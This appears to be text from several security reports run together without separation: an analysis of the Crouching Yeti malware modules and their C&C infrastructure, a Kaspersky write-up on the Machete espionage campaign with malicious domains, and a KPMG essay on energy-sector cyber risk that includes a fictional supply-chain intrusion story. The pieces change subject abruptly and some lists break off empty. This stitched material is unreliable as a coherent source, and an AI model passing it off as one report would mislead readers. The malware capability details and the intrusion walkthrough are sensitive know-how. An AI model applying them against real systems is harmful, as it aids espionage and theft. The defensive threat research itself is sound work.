Harvested data includes : ● Unique system ID ● OS version ● Username ● Computer name ● Country ● Language ● Current IP ● List of drives ● Default Browser ● Running Processes ● Proxy Setting ● User Agent ● Email Name ● BIOS version and date ● Lists of files and folders ( non - recursive ) from Desktop , My Documents and Program Files folders and root directories on all drives .
This module collects contact details stored in all outlook.nk2 files and writes them to the % TEMP % \ { rand } .yls
This module uses the embedded BrowserPasswordDecryptor 2.0 tool ( hxxp : //securityxploded.com / browser - password - decryptor.php ) to dump login credentials stored by the password managers of various browsers .
Decrypted passwords are saved into the % TEMP % \~tmp1237.txt file , which is then copied by the parent module into an encrypted * .tmp.yls file .
List of browsers supported by the tool ( from the product 's website ) : ● Firefox ● Internet Explorer ● Google Chrome ● Google Chrome Canary / SXS ● CoolNovo Browser ● Opera Browser ● Apple Safari ● Comodo Dragon Browser ● SeaMonkey Browser ● SRWare Iron Browser ● Flock Browser This module is designed to scan the local network and look for all hosts listening on ports related to OPC / SCADA software .
Information about these hosts is then saved to the % TEMP % \~tracedscn.yls file .
In - depth analysis of the Havex loader and its related modules is presented in Appendix 2 .
This component is a simple downloader with a functionality similar to the Havex component .
It sends requests to the PHP script at the C & C ( compromised website ) and looks for specific data in the returned HTML code .
It writes the data ( some ASCII strings ) from between < I6 > < /I6 > tags to the file in % TEMP % \Low\~task.tmp and the data ( binary data XORed with 0x0A ) from between < B6 > < /B6 > tags into the % TEMP % \Low\~ldXXXX.TMP file .
Then it decrypts the ldXXXX.TMP file and loads it into memory .
Based on the compilation times , we may assume that this loader was used to download and run modules before it was replaced by Havex .
The Ddex loader is analyzed in more detail in Appendix 4 .
This malware can be described as a classical RAT ( Remote Access Trojan ) , since it gives the attacker a wide range of opportunities to control and interact with the victim machine .
The autonomous part of Sysmain installs and registers itself to be persistent in the system .
Then it gathers general information about the victim system , like ● User- and computer names ● Locale information ● Network- and drive status ● Default browsers ● Running processes ● File listing from the user profile directory .
When ready , this data is submitted to one of the C & C - servers .
After that , it checks periodically for new commands from C & C ( pulling via HTTP ) .
With a set of 11 commands , the malware is able to : ● Execute shell - commands ● Launch additional executables or libraries ( sent by the attacker ) ● Collect arbitrary files for later exfiltration ● Examine the victim 's file system .
There are also commands used for maintenance purposes .
Among others , there are commands to change the pubkey for C & C - communication or delete its traces in the registry .
It receives its commands from one of four static command - and - control servers .
Every variant of this malware has its own set of servers .
As usual , the attackers are using webservers - most likely compromised ones - as part of their C & C - infrastructure .
To communicate with the C & C - server , the Trojan makes use of asymmetric encryption with a hardcoded pair of private and public keys .
Another public key is used to encrypt files , which are collected in a local dropzone on the victim 's file system .
The files in that dropzone will be submitted to the attacker later , all in one go .
Appendix 3 provides in - depth analysis of the Sysmain backdoor .
This component is written in .NET
The settings of the RAT are stored in the registry as BASE64 encoded values .
The RAT gets its commands by sending a request to a PHP script on the C & C ( compromised server ) as usual , and looks for specific data in the returned HTML code .
The data in this case is stored between the havexhavex tags , it is then decrypted and decoded ( base64 ) .
The RAT supports 13 commands including : · Screen capture · Trojan Update · Loading DLLs · Starting executables · Running shell commands · Listing directories Each time a command ( task ) is executed , the result of that command is stored in the registry under a subkey named `` done '' or `` doneEXT '' .
The results ( which are called `` answers '' by the authors ) are then POSTED to the C & C server .
The ClientX backdoor is analyzed in depth in Appendix 5 .
Karagany is a simple backdoor that connects to the C & C and keeps waiting for commands .
It can download and run additional executables , load / delete modules , read file content , reboot the computer , update itself and remove all components .
Besides backdoor functionality , it also extracts credentials from Internet Explorer 's password manager to the prx.jpg file and injects a small DLL into the processes of web browsers .
This DLL keeps listening to outgoing network traffic and looking for basic access authentication details sent over unencrypted HTTP .
Affected browsers include Internet Explorer , Firefox , Mozilla and Opera .
When executed , it copies itself to the folder under % APPDATA % and creates a .lnk
The folder name and filename are chosen from a list of strings hardcoded in the binary : It also creates the C : \ProgramData\Mail\MailAg\ folder , where the information harvested by downloaded modules will be stored .
After checking if a connection to the Internet is up , it sends an initial POST request to the C & C server .
Known parameters used in C & C communication are : ● & identifiant= < victim_uid > , which is calculated based on system version , system install date , username and system metrics ● & version= < bot_version_nr > ● & fichier= < file_content > This module is used to drop and run the DuckLink CmdCapture tool - a 3rd party freeware AutoIt application for capturing screenshots ( hxxp : //www.ducklink.com/ ) .
A screenshot of the desktop is saved into the C : \ProgramData\Mail\MailAg\scs.jpg file .
Additionally , other system information - such as the date and time of capture , computer name , username , cpu architecture , os version , IP address , logon domain and logon server , desktop details ( height , width , depth , refresh rate ) and environmental variables - are logged in C : \ProgramData\Mail\MailAg\scs.txt file .
This module is used to list all files and documents with specified extensions , or which have names containing specified strings in the C : \ProgramData\Mail\MailAg\fls.txt file .
Saved information includes path , size and modification time .
File matching patterns : The Command and Control Servers are compromised legitimate websites , like Blogs , from different countries .
In total we have identified 219 unique domain names for these C & C servers hosted in 21 different countries .
We found most hosted C & Cs in the United States ( 81 servers ) , Germany ( 33 servers ) , the Russian Federation ( 19 servers ) and the United Kingdom ( 7 servers ) .
The table below shows the distribution of victims affected by the samples identified according to our KSN data .
Victims infected with samples from any of the Crouching Yeti group 's malware were found in : 65 of these C & C servers , in the following countries , were monitored during our investigation .
This monitoring enabled us to get a list of the victims connected to them .
The C & C Backend is written in PHP , consisting of 3 files : • `` log.php '' is a Web - Shell , used for file level operations .
Please see `` source.php '' below for further information .
These are its functions on execution : 1 .
Collect the following information : 2 .
Write the above information to `` testlog.php '' , separated by `` Tabulator '' and base64- encoded , with the following syntax : < timestamp > \t < victim ip - address > \t < proxy > \t < botID > \t < request - uri > \t < useragent > 3 .
Write all transferred HTTP - GET Variables to `` < botID > .log
If the bot executes an HTTP - POST - request , the transferred data is written to the file `` < botID > .ans
Check for any `` < botID > _ * .txt '' files a .
If found the first step is to append the timestamp , filename and a `` sent '' Status indicated to `` < botID > .log
Then the file content is transferred to the bot , embedded into HTML with the HTML - Body `` No data ! '' and the HTML - Comment `` havex '' , which contains the data to be transferred .
Finally the file on the server is removed .
If this removal fails it is logged to `` < botID > .log
If no matching file is found , an HTML - Response is sent with an empty `` havex '' HTML - Comment and HTML - Body text `` Sorry , no data corresponding to your request .
Based on the 45 C & C Servers wemonitored , a total of 2,811 unique Victims were discovered .
The average number of victims per C & C is 70 : The following chart depicts the first ( red line ) and last ( blue line ) appearance of each victim on the C & C .
The `` FirstHit '' shows how the rate of accumulating new victims has accelerated over the course of 2014 .
This could mean victims are disinfecting their computers , or it may be that they simply report to a different C & C server that we do not monitor .
Mapping the unique hits of victims per day also indicates a decrease of `` active '' infections .
The following chart clearly shows a difference between weekdays ( groups of five higher bars ) and weekends ( two lower bars ) .
The daily unique hit - rate fell by about half from around 800 connections at the beginning of 2014 to around 400 connections per week - day by the middle of the year : More than half of the victims always connect from the same IP address .
Fewer than half of the victims connect from two or more different IP addresses as the following graph shows .
This might indicate that some of the victims are behind proxies , which makes sense for corporate environments .
Victims using many different IP addresses may indicate laptops .
The following chart visualizes all the unique victims connecting to C & C servers .
The main C & C Servers can be clearly seen in Russia and the USA .
The victims are distributed across 99 different countries .
From the total of 2,811 victims , it was possible to accurately identify 106 of them .
Appendix 8 contains a brief description about the sector / company in which these victims operate .
The table below summarizes the distribution of the identified victims by sector .
Based on our monitoring , the most widespread Backdoor is Havex with a total of 2,470 infected systems , mostly based in USA and Spain : 32 different versions of Havex are used among all victims , with 51 victims left without any identifiable Havex version .
Havex Version 024 , compiled at the end of 2012 , is the most widespread .
Besides the Havex version , the OS Version of the victim computer is also communicated to the C & C server .
The most common Operating System among victims is Windows XP , but Windows 8.1 is also on the list .
The Sysmain victims connect to six of the monitored C & C servers , where 261 unique victims were counted , located in 38 different countries .
Victims of the Clientx backdoor connect to 2 of the monitored C & C Servers , where 10 unique Victims were counted in 5 different countries .
Based on the analysis of the monitored C & C Servers we can identify some clusters based on malware versions and the victims .
This graph visualizes these relations .
Every dot represents a victim , different Backdoors and versions are colored differently .
The C & C Servers are also represented as dots where several clients connect .
Grey lines are connections from a victim to its C & C Server .
Some C & C Servers are dedicated to a given version of a backdoor ( big Cluster ) .
Others share connections with different backdoor versions and different backdoors .
Breaking this down to the sectors of the identified victims , we can not see any correlation between C & Cs and victims .
The same sectors are targeted with different backdoor versions .
Compared to our other APT research the available data is more non - specific than usual .
There simply is no one piece or set of data that would lead to the conclusion that the threat actor is Bear , Kitten , Panda , Salmon , or otherwise .
Significant data points below .
It is rare to see file timestamps used as a precise , primary source of information when it comes to threat actor attribution .
In previous reports , these timestamps have been used as supporting , or secondary pieces of data .
They may help to suggest or support a time range for attacker activity , but they are very easily modified .
So it is not very helpful to focus on this data set .
The strings present in the backdoors , web components , and exploits are in English .
Almost 200 malicious binaries and the related operational content all present a complete lack of Cyrillic content , the opposite of our documented findings from researching Red October , Miniduke , Cosmicduke , Snake , and TeamSpy .
The OPC module strings include typos and bad grammar .
Some are so bad they are almost silly and there does n't seem to be a consistent pattern here : Programm was started at % 02i : % 02i : % 02i Start finging of LAN hosts ...
Finding was fault .
Unexpective error Was found % i hosts in LAN : Hosts was't found .
There are also three interesting strings inside the Karagany backdoor : identifiant ( which is French for identifier ) , fichier ( French for file ) and liteliteliteskot ( lite scot is Swedish for little sheet ) Timestamp analysis is based on a total of 154 collected binaries : ● 124 Havex loader samples ( versions 01 - 044 ) + 7 downloaded modules ● 7 Sysmain backdoor samples ● 4 Ddex loader samples ● 1 ClientX backdoor sample ● 4 Karagany Trojan samples + 2 downloaded modules ● 3 samples of Trojanized installers Highlights : ● The earliest samples related to this campaign are the Ddex loader binaries with compilation timestamps between October and November 2010 .
All the servers appear to be hacked servers .
According to the available data , no zero - day exploits were used in any of these attacks , either to compromise the servers in the first place , or delivered as client side attack exploits by the Lights Out Exploit Kit .
While this purely malicious re - use of metasploit PoC highlights the danger that these attack tools pose , it is also unusual to see an exclusively metasploit attack toolset effectively used in this way , delivered from what appear to be a chain of higher value compromised sites .
All of these compromised web applications were vulnerable to freely available offensive security tools .
We acknowledge that many of the compromised referrer servers were related to power producers in some way .
However , these targets almost seem an afterthought , as the exploit servers themselves were compromised web servers from Cuban travel agency sites , a Californian winery site , a US based women 's fashion site , an Iranian general interest / religious inspiration site , a number of dating and adult content websites , and a variety of others .
Although , we note that the known Trojanized software packages were ICS / SCADA related as well , possibly because those victim sets or environments required special attention .
So , while there was a strong set of offensive activities on power producers during the campaigns , it was by no means the full focus of them .
While it may be `` shocking '' to observe power producers around the world targeted by any one threat actor , this actor 's attack activity does not appear to be constrained to power producers .
The related industries of interest show a much broader global scope than previously discussed , and the geographic regions of interest have gone completely undiscussed .
For example , Spain had the highest number of victims .
However , it appears that there was no significant correlation between the victim location and the C & C geolocation .
And , according to our data , the list also includes victim organizations fitting the following additional categories : • Pharmaceuticals • Health • Cleaning • Education • Automotive • Transportation • Packaging • Network Infrastructure • Information Technology • Structural Engineering • Mechanical Engineering The Crouching Yeti actor has been performing massive surveillance campaigns in recent years , since at least 2010 .
Their targets included thousands of victims of which we were able to identify a few , confirming Crouching Yeti 's interest in several strategic sectors .
The distribution strategy of the group focuses on methods following this targeted philosophy , including spear phishing and waterholing .
Noticeably , they also compromised legitimate software packages from strategic actors in the SCADA sector in order to infect their final victims .
The victim list confirms that the tactic proved successful .
There is nothing especially sophisticated in their exploits , or in the malware they used to infect victims .
Their RATs are flexible enough to perform surveillance and data exfiltration efficiently .
They used dozens of compromised servers as Command and Control domains with a simple , but effective , PHP backend .
However there is an interesting connection with this group and the LightsOut Exploit Kit for the distribution of its malware in some waterholing attacks .
We believe they are likely its only operators as of June 2014 .
Thanks to the monitoring of several of the Command and Control domains used by the group , we were able to identify several victims .
This victims ' list reinforces the interests shown by the Crouching Yeti actor in strategic targets , but also shows the interest of the group in many other not - so - obvious institutions .
We believe they might be collateral victims , but it might also be fair to redefine the Crouching Yeti actor not only as a highly targeted one in a very specific area of interest , but a broad surveillance campaign with interests in different sectors .
We will continue monitoring this actor .
Some time ago , a Kaspersky Lab customer in Latin America contacted us to say he had visited China and suspected his machine was infected with an unknown , undetected malware .
While assisting the customer , we found a very interesting file in the system that is completely unrelated to China and contained no Chinese coding traces .
At first look , it pretends to be a Java related application but after a quick analysis , it was obvious this was something more than just a simple Java file .
It was a targeted attack we are calling '' Machete '' .
We believe this campaign started in 2010 and was renewed with an improved infrastructure in 2012 .
The operation may be still `` active '' .
The malware is capable of the following cyber - espionage operations : Logging keystrokes Capturing audio from the computer 's microphone Capturing screenshots Capturing geolocation data Taking photos from the computer 's web camera Copying files to a remote server Copying files to a special USB device if inserted Hijjacking the clipboard and capturing information from the target machine Most of the victims are located in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain , among others .
In some cases , such as Russia , the target appears to be an embassy from one of the countries of this list .
Targets include high - level profiles , including intelligence services , military , embassies and government institutions .
The malware is distributed via social engineering techniques , which includes spear - phishing emails and infections via Web by a fake Blog website .
We have found no evidence of of exploits targeting zero - day vulnerabilities .
Both the attackers and the victims appear to be Spanish - speaking .
During this investigation , we also discovered many other the files installing this cyber - espionage tool in what appears to be a dedicated a spear phishing campaign .
These files display a PowerPoint presentation that installs the malware on the target system once the file is opened .
These are the names of the PowerPoint attachments : Hermosa XXX.pps.rar Suntzu.rar El arte de la guerra.rar Hot brazilian XXX.rar These files are in reality Nullsoft Installer self - extracting archives and have compilation dates going back to 2008 .
A consequence of the embedded Python code inside the executables is that these installers include all the necessary Python libraries as well as the PowerPoint file shown to the victim during the installation .
The result is extremely large files , over 3 MB .
Here are some screnshots of the mentioned files : A technical relevant fact about this campaign is the use of Python embedded into Windows executables of the malware .
This is very unusual and does not have any advantage for the attackers except ease of coding .
There is no multi - platform support as the code is heavily Windows - oriented ( use of libraries ) .
However , we discovered several clues that the attackers prepared the infrastructure for Mac OS X and Unix victims as well .
In addition to Windows components , we also found a mobile ( Android ) component .
Both attackers and victims speak Spanish natively , as we see it consistently in the source code of the client side and in the Python code .
The following code snippets were found into the HTML of websites used to infect victims : Note : Thanks to Tyler Hudak from Korelogic who noticed that the above HTML is copy pasted from SET , The Social Engineering Toolkit .
Also the following link to one known infection artifact : hxxp : //name.domain.org / nickname / set / Signed_Update.jar The following are domains found during the infection campaign .
Any communication with them must be considered extremely suspicious java.serveblog.net agaliarept.com frejabe.com grannegral.com plushbr.com xmailliwx.com blogwhereyou.com ( sinkholed by Kaspersky Lab ) grannegral.com ( sinkholed by Kaspersky Lab ) Creates the file Java Update.lnk pointing to appdata / Jre6/java.exe Malware is installed in appdata/ MicroDes/ Running processes Creates Task Microsoft_up The first evidence is the language used , both for the victims and attackers , is Spanish .
The victims are all Spanish speaking according to the filenames of the stolen documents .
The language is also Spanish for the operators of the campaign , we can find all the server side code written in this language : reportes , ingresar , peso , etc .
The `` Machete '' discovery shows there are many regional players in the world of targeted attacks .
Unfortunately , such attacks became a part of the cyber arsenal of many nations located over the world .
We can be sure there are other parallel targeted attacks running now in Latin America and other regions .
Kaspersky Lab products detect malicious samples related to this targeted attack as Trojan- Spy . Python . Ragua .
Note : A full analysis of the Machete attacks is available to the Kaspersky Intelligent Services customers .
Companies now not only face cyber attacks from hacking groups , script kiddies and hactivists , they are also threatened by state - sponsored agencies with limitless resources .
These agencies usually carry out cyber attacks to seek a competitive edge , gain access to intellectual property , or for sheer sabotage .
In other words , cyber threats have never been more pervasive and attack damages never more real .
The situation is especially grim for the Energy and Natural Resources ( ENR ) industry .
The sector is plagued by two key problems .
For one , top management has traditionally not placed sufficient emphasis on information security .
Also , much more focus is placed on connectivity compared to security .
As a result , the ENR sector has become an enticing and relatively easy target for cyber attacks .
As evidenced in recent cyber incidents `` Shamoon '' and `` Night Dragon '' , the resultant loss and combined damage , be it substantial or intellectual , would be far greater than the cost of preventive security measures .
In this increasingly insecure environment , senior management should refresh their perspective to safeguard their key corporate assets .
For many organisations in the Asia Pacific , a cyber security - oriented structural transformation might be necessary .
And even they are converging into one category : companies that have been hacked and will be hacked again .
Compared to the past when criminals used a scattergun approach , cyber attacks now are much more focused and intelligent .
Let us first take a peek into an attacker 's world .
Understanding the perspective of an attacker is essential for everyone involved in fighting cybercrime .
For that reason , staff in KPMG Netherlands interviewed one of their professionals – an ' ethical hacker ' .
He relayed us an intriguing fictitious story .
It is up to you to judge how realistic this threat would be to your organisation .
He approached me a few weeks ago with a job offer .
The goal he set was quite ambitious : steal as many secrets from the government as you can .
Let me tell you about the steps I took .
First , I sat down to think about what I knew about the government 's IT infrastructure .
At a conference last fall , I had met an IT director of a ministry who had told me that all firewalls for the government were supplied by the same vendor , company Y. Hacking such a firewall was a formidable task - not something I was ready to take on directly .
Instead , I took a more indirect approach .
I logged in to LinkedIn and searched for employees of software development companies who mentioned company Y as one of their clients on their LinkedIn profile .
Many professionals mention prestigious client names in their profile , even when company policy prohibits name dropping .
Shortly after , I found multiple software vendors which make niche software and listed company Y as a client .
I visited the vendors ' websites and scanned their externally reachable IP addresses until I found one which had an unpatched vulnerability in their web server : company X .
After a day 's work , I was inside their network .
Company X is a small organisation and they do not feel they need network segmentation , so I was able to reach all machines on their internal network through that web server .
After some more work , I was able to elevate my privileges to domain administrator , which meant I had full access to all of their systems .
This was where I hit a bump .
I intended to change the source code of their product in such a way that it would allow me to connect remotely to the system of anyone who installed it , but I had never done that before .
I then decided to log on to a hacker forum and posted a request for help .
I offered 10,000 euros reward for a job well done .
After a while , I was approached by someone who was willing to help me .
I asked around to confirm his reputation in this field .
I enlisted his help in modifying the source code of the main product of company X .
The security policies of company Y were very strict : only the system administrators can install software on the workstations , and both incoming and outgoing traffic goes through a proxy server .
Luckily , the virus which my associate hacker had written communicates through DNS , which was not actively monitored or filtered .
The software from company X was updated on a regular basis , and after three weeks I received a message which indicated that I had access to their workstations .
I called on my associate hacker once more , but this time for a more advanced task : reprogramming the firmware of the firewalls which company Y produces .
He indicated that he needed the help of a contact who installed a backdoor in all firewalls for another 20,000 euros .
Now , all I needed to do was wait for the next update of the firmware .
I posted some fake security vulnerabilities for the current version of this firmware , to ensure that the firmware would be upgraded timely .
And slowly but surely , I gained access to all internal networks of the government .
I could then route any traffic which flows through any government network through my own computer .
I can also read all emails which are sent between government employees internally .
I can find vulnerable servers by scanning the networks .
In almost all the internal networks , I have found at least one server which I can exploit .
I installed backdoors on hundreds of workstations which allows me the ability to monitor email servers , so emails with interesting attachments can be forwarded to me .
Additionally , I have obtained login credentials for almost all major government databases .
Every day , almost two hundred gigabytes of government secrets are sent to me automatically .
This amount is only limited by the amount of bandwidth I can get , and the number of hard disk drives I install .
I ' m being paid 100 euros per gigabyte of information .
I will leave it to you to calculate my hourly wage .
A report by the Government Accountability Office indicated that 24 key government agencies in the United States have logged a 650 percent increase in cyber security incidents in 2011 compared to five years ago .
According to a survey by KPMG Netherlands , 49 percent of organisations have experienced some form of cybercrime activity during the past 12 months while the remaining may not even have proper detection measures in place .
Among the 49 percent , 10 percent indicated that they have been attacked more than 100 times within the past year .
The remaining respondents said they were attacked successfully up to five times last year .
Most of the incidents were not covered by the media and are therefore not publicly known .
Information leakage most common Globally , information leakage is one of the most common challenges faced by organisations .
Opening an email containing a virus from a hacker can allow perpetrators to seize control of your computer , read your emails and record your passwords .
Information leakage is in fact one of the most common types of incidents across the world and can easily take place in your daily life .
Take for example that you have made a donation to a local charity .
In recognition of your contribution , the organisation lists your name on their website as a sponsor .
Two days later , you receive an email from the Fundraising Chair asking you to confirm your donation .
You open the email , fill out the form ( you are also careful not to include any banking or sensitive information ) and return it to the sender .
But in reality , the email did n't come from the charity at all ; the attachment was , in fact , a high quality fake containing a virus , allowing perpetrators to seize control of your computer , read your emails and record your passwords .
Everything you know or see is now visible to the perpetuators .
Clearly , information leakage is rapidly becoming a board - level risk .
A 2012 survey by KPMG suggest that more than three - quarters of the Forbes 2000 companies leak potentially dangerous data ( See Figure 1 below ) .
Personal information and financial data are often lost due to hacking , system failure , human negligence and disgruntled employees .
Some countries have already enacted legislation to curb such problems .
The European Commission 's General Data Protection Regulation released in 2012 states that companies have the obligation to protect their network and personal information .
Companies must also authorities within 24 hours after a serious breach , or face a penalty of up to one million Euros or two percent of turnover .
It is worth noting that hacktivist groups are often the agents responsible for information leakage .
For instance , members of `` Anonymous '' , a famous hacktivist group , are not only known for bringing down commercial systems and websites , they have also infiltrated into commercial organisations ' computer systems , exposing correspondence and personal data to the public in the process .
In 2010 , Anonymous penetrated Sony 's network and cost the latter US $ 170 million dollars in reparation for the unauthorised disclosure of customers ' names and credit card numbers .
Another Anonymous ' affiliate group AntiSec dumped over 860,000 user credentials including 75,000 sets of personal and financial information into the open Internet after breaking into the firm Stratfor 's systems .
During the past few years , industries all around the globe have witnessed for the first time carefully engineered and profoundly complex attacks such as Stuxnet , Night Dragon and Shamoon ( these will be described later in the document ) .
Cyber security has become a grim issue that no one can avoid .
Of all the potential marks at crosshair , the ENR industry is one of the most attractive targets for cyber criminals .
According to the United States ( US ) Department of Homeland Security News Wire published in April 2012 , American water and energy companies deal with a constant barrage of cyber attacks on a daily basis .
These incidents usually take the form of cyber espionage or denial - of - service ( DoS ) attacks against the utilities ' industrial - control systems .
According to a survey report released by The Centre for Strategic and International Studies in 2010 , `` critical infrastructure firms such as power grids , industrial control networks and oil refineries are facing staggering level of cyber attacks , and are not adequately prepared to defend themselves '' .
In April 2012 , the US Cyber Security response team warned of attacks upon the gas industry .
The Industrial Control Systems Cyber Emergency Response Team ( ICS - CERT ) reported a number of cyber intrusions targeting gas pipeline companies .
Analysis of the attacks confirmed they are part of an ongoing campaign dating back to December 2011 and indicated Spear Phishing was used to target a number of specific individuals across the gas pipeline industry .
Spear phishing is an e - mail spoofing fraud attempt that targets a specific organisation , seeking unauthorised access to confidential data .
On 15 August 2012 , Saudi Aramco , a large national oil and gas company with global operations , announced that they had to disconnect their IT systems from the Internet while dealing with a serious disruption of their network .
The disruption , which continued for two weeks , was the result of a cyber attack that used a computer virus to disable over 30,000 of the company 's workstations .
The virus , later named as `` Shamoon '' , was the first significant cyber attack on a commercial target to cause real damage .
It is also the most destructive attack the private sector has experienced to date .
Later in the same month Rasgas , a main player in the Qatari Liquid and Natural Gas scene , was also hit by the Shamoon ( as per security experts ) virus and consequently forced to bring their entire network offline .
Another series of cyber incidents in the ENR sector were dubbed collectively by security company McAfee as `` Night Dragon '' .
Evidence from McAfee has shown that this series of well - coordinated and specifically focused attacks involve a myriad of different techniques and methods .
The primary target seems to be any financial information related to bids and oil - and - gas operations .
There are many more cyber security incidents which have taken place in the ENR industry .
In 2011 , a Canadian - based company which supplies remote administration and monitoring tools to Fortune 100 energy companies reported that it had suffered a security breach .
Upon breaching the corporate network , the attackers installed malicious software on computers and stole information related to a remote administration tool which the company supplies .
Another incident of more recent times occurred in early 2013 .
In February 2013 , the US Department of Energy confirmed that computers and servers at its Washington headquarters were compromised in the previous month .
In this attack , personally identifiable information of several hundred employees and contractors may have been compromised .
Seemingly non - critical at first glance , this information may however be used to further future attacks into having serious consequences .
In another case , unidentified hackers helped a manufacturer in China obtain the breakthrough design of a wind turbine by an energy company in the United Kingdom .
The Chinese manufacturer subsequently made and sold the product at a much lower price , driving the original company in the UK into closure .
A report published by McAfee in 2011 stated that four out of every five oil , gas and power companies have suffered at least one DoS attack in 2011 .
Cyber attacks are also increasingly escalating into cyber warfare .
In an October 2012 Wall Street Journal article , U.S. officials noted that `` Iranian hackers with government ties have mounted cyber attacks in 2012 against American targets , escalating a low - grade cyber war ...
The Iranian effort culminated in a series of attacks against U.S. banks as well as electronic assaults on energy companies in the Persian Gulf .
The obvious question to ask is why these various organisations are so vulnerable in the face of cyber attackers .
In 2012 , Carnegie Mellon University conducted their yearly survey for largest American companies .
The results indicated that more than 70 percent of C - Suite executives and members of the board are not actively involved in the protection of their company data .
They are also rarely involved in the inspection of key employees working on information security or the revision of corporate - wide policies in this aspect .
A similar trend has been observed by the Government Accountability Office in American government agencies .
Despite receiving numerous security recommendations each year , companies were not implementing these properly .
Key personnel were also not being trained adequately .
In addition , there is a lack of proper monitoring on security controls or appropriate key performance indicators to assess improvement .
The ENR sector is critical as it powers the growth of almost every economy in the world .
The sector can be broadly divided into three categories : electricity , petroleum and natural gas .
In the electricity category , both automation systems and utilities controls of electricity infrastructure are built on a complicated system known as the Supervisory Control and Data Acquisition ( SCADA ) .
Similarly , the production and distribution of petroleum and natural gas are heavily dependent on systems similar to SCADA .
Unfortunately , such industrial infrastructure control systems have been facing a severe legacy problem in recent years .
They have been rashly connected to the Internet for remote accessibility without implementing adequate security measures .
This has in turn led to higher chances of such systems falling prey to cyber attacks .
In this era of information and connectivity , malicious hackers are able to easily find information assets as targets in a corporate network .
What is at stake is financially valuable data such as mergers - and - acquisitions plans , transaction records , quarterly / annual reports and internet banking details .
Strategic information including intellectual property , contact details of senior executives , records of legal disputes and various trade secrets are also at risk .
In addition , personal data like employees ' addresses and date of birth , once compromised might very well be used in facilitating identity theft .
Last but not least , process control networks are being increasingly favoured by attackers given their vast potential in bringing about significant impact , as proven in the famous Stuxnet case and other incidents described earlier .
Given how the numerous production and exploration activities carried out by energy companies are dependent on these networks , this trend is of particular relevance and importance to the ENR sector .
A 2011 report by KPMG has shown that oil and gas operations are amongst the top 10 sectors which suffer from the most information leakages worldwide .
Information leakages involving oil and gas operations account for six percent of all security incidents .
Some of the sources of leakage are within the direct control of the corporation and can be prevented if companies put in the effort .
These sources include websites , documents and web servers .
However , there are also other channels such as popular search engines and forums which are outside of the usual enterprise security curtain and pose a much more complex challenge .
The KPMG report also revealed that 78 percent of Forbes 2000 corporate websites leak some form of potentially useful information through their document meta - data .
Document meta - data is information ' about ' a document , or information on its properties .
It often informs who created a document , when and where on a device or network .
According to version information retrieved from document meta - data , 71 percent of the 2000 companies may be using potentially vulnerable and out - dated versions of Microsoft and Adobe software .
Furthermore , 16 percent of corporate web servers may be vulnerable to attack due to missing security patches or out - dated server software .
Many instances of un - patched and unsupported web server software were found to be serving Forbes 2000 corporate websites .
Part of KPMG 's research focused on the structure of the Forbes 2000 corporate websites to identify any potentially sensitive file locations or hidden functionality that may be useful to cyber attackers .
A number of file locations marked ' private ' were also identified , hosting documents that were not intended for public consumption ( See Figure 2 below ) .
The direct result is that out of all the servers used for corporate websites , 15 percent offer hacker access to test functionality and private login portals that potentially allow file upload capabilities that could likely lead to full take - over of servers by cyber attackers .
Oil & Gas operations have also emerged in the list of top 10 sectors that post most information to public forums and newsgroups .
There are as many as 88,681 of such postings in newsgroup alone , according to the report .
If past experience has taught us anything , it is that cyber attackers and organised crime do not target one avenue of attack .
Instead , they use a combination of available information leaks to profile a target , and map out the target 's internal systems and their components .
It is important to emphasise that the processes used to gather the information leaks mentioned above are not sophisticated and available to anyone with access to the Internet and little more than a web browser .
The problem is even worse when it comes to control systems which are widely adopted by ENR industries , as explained by chief cyber security strategist from Computer Sciences Corporation ( CSC ) , Donald Purdy .
Purdy , formerly a cyber official at the Department of Homeland Security , mentioned during a major security conference in San Francisco in 2012 : '' These are older systems so they are harder to control .
And for convenience and cost savings , people have connected them to the internet in order to control them from remote locations .
So this is almost a perfect storm in terms of vulnerability because the nation is so dependent on these systems … This is a significant security issue for the United States and frankly for the world .
For instance , Justin W. Clarke , a 30-year - old cyber security researcher and electric utility expert discovered two major vulnerabilities in 2012 on Siemens ' RuggedCom equipment which is extensively used by companies in communicating with power stations situated in different locations .
The first vulnerability is essentially a secr `` back door '' which would easily allow hackers remote access into the equipment .
The second vulnerability makes it possible for hackers to intercept the network traffic between operator and devices which may contain authentication credentials .
Potential attackers could take advantage of such flaws to manipulate power stations or use these flaws to launch another set of attacks on a much larger scale .
The situation is made even worse when independent researchers release and circulate system flaws and vulnerabilities for reference and countermeasure studies .
While the intention behind such documents might be good , the direct consequence is that many could now easily gain access to dangerous and powerful `` weapons '' such as the code of Stuxnet , which can cause immense damage to critical infrastructures .
In contrast to the published vulnerabilities , certain manufacturers of critical system controllers are reacting way too slowly which have resulted in research groups like Digital Bond , releasing exploits for these vulnerabilities in order to `` stimulate '' the patching and upgrading efficiency .
When it comes to electrical power , technology is also a double - edged sword .
While advances in smart grid technologies have helped better detect power theft and reduce power loss with smart meters been recently deployed in countries such as in Serbia and Brazil , these technologies also give rise to possibilities of their advanced functionalities being used for shady purposes .
For instance , two demonstrations at Security B - Sides and Black Hat conferences illustrated that hackers could basically tweak the smart metres currently in use to perform functionalities as they wish , which include changing of temperature , controlling of lighting and even cutting of power during emergencies .
As a side note on corporate security policies and procedures , the Saudi Aramco incident where large number of business computers were disabled , also highlighted importance of monitoring network attacks initiated by inside personnel and the potential danger of using portable storage media like thumb drives .
Over the years , two major shifts in trends have been observed in terms of cyber attacks .
Firstly , the targets are shifting from individual organisations to chains of related companies .
Secondly , the main components of attackers have shifted from script kiddies to criminal groups , with the latter being much more specialised and coordinated .
Some of the major players include : • organised cyber criminals who are most known for mass stealing of personal identities and financial data , • state or corporate sponsored espionage like the Night Dragon operation which aims to steal critical intellectual and business information , • hacktivists such as Wikileaks , Anonymous and LulzSec who have amassed a large number of supporters and participants , • malicious inside personnel , as in the case of Bradley Edward Manning , a United States Army soldier who was arrested in May 2010 in Iraq on suspicion of having passed classified material to the website WikiLeaks .
Just as attacks have evolved , companies too must evolve by re - evaluating their own ability to detect , defend and respond to cyber attacks .
Cyber incidents can be loosely divided into three categories .
The first category is accidental events due to human error , system failure or unanticipated accidents .
The second category refers to unauthorised access into networks and systems by hackers or employees .
The third category does not require actual access as it usually causes denial of service or loss of data .
Attack methods could involve complicated and coordinated efforts to beat the cyber security protection mechanism and intelligence reconnaissance , followed by social engineering techniques for acquiring of target information .
There are six most common types of security failings .
These are shared accounts , weak passwords , lack of effective network monitoring , lack of effective Web monitoring , absence of logging and absence of log analysis .
Lack of user awareness also provides more opportunities for social engineering attempts to succeed .
